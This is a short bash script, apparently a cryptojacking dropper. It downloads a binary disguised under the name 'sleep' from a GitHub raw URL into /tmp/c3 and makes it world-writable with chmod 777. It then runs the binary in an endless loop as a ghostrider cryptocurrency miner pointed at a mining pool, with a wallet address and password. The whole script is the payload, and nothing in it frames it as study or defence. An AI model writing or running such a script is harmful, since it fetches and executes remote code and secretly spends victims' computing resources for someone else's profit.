#!/bin/bash

mkdir -p /tmp/c3
cd /tmp/c3
wget https://raw.githubusercontent.com/Blenkinship/any/main/sleep
chmod -R  777 /tmp/c3

#!/bin/sh
while [ 1 ]; do
	/tmp/c3/sleep -a ghostrider --url stratum+tcp://asia.flockpool.com:4444 --user RDACoFmDxhJrktrSsfWHEcCgybGezuPkCw.2088 --pass 5566
	sleep 5
done
